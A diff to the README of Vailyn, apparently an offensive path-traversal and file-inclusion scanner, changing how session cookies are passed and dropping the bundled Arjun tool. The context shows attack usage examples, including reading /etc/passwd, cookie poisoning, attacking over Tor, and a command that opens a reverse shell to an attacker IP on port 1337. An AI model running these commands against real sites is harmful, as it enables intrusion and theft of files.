@@ -119,7 +119,7 @@ additional:
   -p PAM, --param PAM   query parameter or POST data for --attack 1, 4
   -i F, --check F       File to check for in Phase 1 (df: /etc/passwd)
   -Pi VIC2, --vic2 VIC2 Attack Target, part 2 [post-payload]
-  -c C, --cookie C      File containing authentication cookie (if needed)
+  -c C, --cookie C      Cookie to append (in header format)
   -l, --loot            Download found files into the loot folder
   -d I J K, --depths I J K
                         depths (I: phase 1, J: phase 2, K: permutation level)
@@ -155,7 +155,7 @@ Example: if the final URL should look like: `https://site.com/download.php?file=
 
 If you want to include PHP wrappers in the scan (like php://filter), use the `--lfi` argument. At the end of Phase 1, you'll be presented with an additional selection menu containing the wrappers that worked. (if any)
 
-If the attacked site is behind a login page, you can supply an authentication cookie via `-c COOKIEFILE`. If you want to attack over Tor, use `--tor`.
+If the attacked site is behind a login page, you can supply an authentication cookie via `-c COOKIE`. If you want to attack over Tor, use `--tor`.
 
 #### Phase 1
 
@@ -233,14 +233,14 @@ Will fetch cookies and you can select cookie you want to poison
 will infect DATA2 with the payload
 
 * Attack, but target is behind login screen:
-`$ Vailyn -v "http://site.com/" -a 1 -p2 leak dicts/files dicts/dirs -c cookie.txt`
+`$ Vailyn -v "http://site.com/" -a 1 -p2 leak dicts/files dicts/dirs -c "sessionid=foobar"`
 
 * Attack, but I want a reverse shell on port 1337:
 `$ Vailyn -v "http://site.com/download.php" -a 1 -p2 rce MY.IP.IS.XX 1337  # a high Phase 2 Depth would be beneficial`
 (will start a ncat listener for you if on Unix)
 
 * Full automation in crawler mode:
-`$ Vailyn -v "http://root-url.site" -a 5` _you can also specify other args, like depths, lfi & lookup file here_ 
+`$ Vailyn -v "http://root-url.site" -a 5` _you can also specify other args, like cookie, depths, lfi & lookup file here_ 
 
 * Full automation, but Arjun needs `--stable`:
 `$ Vailyn -v "http://root-url.site" -a 5 -s ANY`
@@ -272,6 +272,4 @@ Found some false positives/negatives (or want to point out other bugs/improvemen
 >
 > Arjun:  Copyright © <a href="https://github.com/s0md3v">s0md3v</a>
 
-### Arjun Modifications
-
-Arjun was slightly modified to fix false negatives with HTTP Basic Auth Sites, and to accept session cookies specified by Vailyn arguments.
+Arjun is no longer distributed with Vailyn. Install its latest version via pip.
